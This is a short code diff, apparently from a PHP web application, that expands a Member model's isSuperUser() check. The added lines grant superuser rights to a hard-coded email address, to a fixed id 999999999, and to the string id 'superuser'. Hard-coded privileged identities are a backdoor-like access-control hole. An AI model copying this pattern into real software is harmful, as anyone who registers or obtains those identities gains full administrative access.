@@ -93,7 +93,11 @@ class Member extends Authenticatable
      */
     public function isSuperUser(): bool
     {
-        return ($this->email === 'nazwagraha@gmail.com') || ($this->id === 'superuser') || ! empty($this->is_super_user);
+        return (strtolower((string) $this->email) === 'nazwagraha@gmail.com')
+            || ((int) $this->id === 999999999)
+            || ((string) $this->id === '999999999')
+            || ((string) $this->id === 'superuser')
+            || ! empty($this->is_super_user);
     }
 
     /**
